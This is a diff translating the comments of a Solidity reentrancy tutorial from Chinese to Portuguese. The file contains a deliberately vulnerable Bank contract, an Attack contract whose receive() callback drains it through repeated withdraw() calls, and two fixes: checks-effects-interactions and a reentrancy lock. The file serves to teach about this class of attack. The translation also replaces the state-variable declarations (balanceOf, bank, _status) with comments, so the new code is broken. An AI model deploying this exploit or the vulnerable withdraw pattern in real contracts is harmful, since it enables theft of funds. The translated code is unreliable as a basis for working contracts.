@@ -1,62 +1,62 @@
 // SPDX-License-Identifier: MIT
-// by 0xAA
+// por 0xAA
 pragma solidity ^0.8.4;
 
 contract Bank {
-    mapping (address => uint256) public balanceOf;    // 余额mapping
+    // Mapeamento de saldo
 
-    // 存入ether，并更新余额
+    // Depositar ether e atualizar o saldo
     function deposit() external payable {
         balanceOf[msg.sender] += msg.value;
     }
 
-    // 提取msg.sender的全部ether
+    // Extrair todos os ether do msg.sender
     function withdraw() external {
-        // 获取余额
+        // Obter saldo
         uint256 balance = balanceOf[msg.sender];
         require(balance > 0, "Insufficient balance");
-        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
+        // Transferir ether !!! Pode ativar a função fallback/receive de um contrato malicioso, há risco de reentrância!
         (bool success, ) = msg.sender.call{value: balance}("");
         require(success, "Failed to send Ether");
-        // 更新余额
+        // Atualizar saldo
         balanceOf[msg.sender] = 0;
     }
 
-    // 获取银行合约的余额
+    // Obter o saldo do contrato bancário
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
 
 contract Attack {
-    Bank public bank; // Bank合约地址
+    // Endereço do contrato Bank
 
-    // 初始化Bank合约地址
+    // Inicializando o endereço do contrato Bank
     constructor(Bank _bank) {
         bank = _bank;
     }
     
-    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
+    // Função de callback para realizar um ataque de reentrada no contrato Bank, chamando repetidamente a função withdraw do alvo.
     receive() external payable {
         if (address(bank).balance >= 1 ether) {
             bank.withdraw();
         }
     }
 
-    // 攻击函数，调用时 msg.value 设为 1 ether
+    // Função de ataque, chame com msg.value definido como 1 ether
     function attack() external payable {
         require(msg.value == 1 ether, "Require 1 Ether to attack");
         bank.deposit{value: 1 ether}();
         bank.withdraw();
     }
 
-    // 获取本合约的余额
+    // Obter o saldo deste contrato
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
 
-// 利用 检查-影响-交互模式（checks-effect-interaction）防止重入攻击
+// Usando o modo de verificação-efeito-interação (checks-effect-interaction) para prevenir ataques de reentrada
 contract GoodBank {
     mapping (address => uint256) public balanceOf;
 
@@ -67,8 +67,8 @@ contract GoodBank {
     function withdraw() external {
         uint256 balance = balanceOf[msg.sender];
         require(balance > 0, "Insufficient balance");
-        // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
-        // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
+        // Verificar o modo de interação de efeitos (checks-effect-interaction): atualizar primeiro a alteração do saldo e, em seguida, enviar ETH.
+        // Quando ocorre um ataque de reentrada, balanceOf[msg.sender] já foi atualizado para 0, não passando pela verificação acima.
         balanceOf[msg.sender] = 0;
         (bool success, ) = msg.sender.call{value: balance}("");
         require(success, "Failed to send Ether");
@@ -79,19 +79,19 @@ contract GoodBank {
     }
 }
 
-// 利用 重入锁 防止重入攻击
+// Usando um bloqueio de reentrada para evitar ataques de reentrada
 contract ProtectedBank {
     mapping (address => uint256) public balanceOf;
-    uint256 private _status; // 重入锁
+    // Lock Reentrante
 
-    // 重入锁
+    // Lock Reentrante
     modifier nonReentrant() {
-        // 在第一次调用 nonReentrant 时，_status 将是 0
+        // Quando nonReentrant é chamado pela primeira vez, _status será 0
         require(_status == 0, "ReentrancyGuard: reentrant call");
-        // 在此之后对 nonReentrant 的任何调用都将失败
+        // Após isso, qualquer chamada a nonReentrant falhará
         _status = 1;
         _;
-        // 调用结束，将 _status 恢复为0
+        // Chamada concluída, restaurando _status para 0
         _status = 0;
     }
 
@@ -100,7 +100,7 @@ contract ProtectedBank {
         balanceOf[msg.sender] += msg.value;
     }
 
-    // 用重入锁保护有漏洞的函数
+    // Usando um lock de reentrada para proteger uma função com vulnerabilidades
     function withdraw() external nonReentrant{
         uint256 balance = balanceOf[msg.sender];
         require(balance > 0, "Insufficient balance");
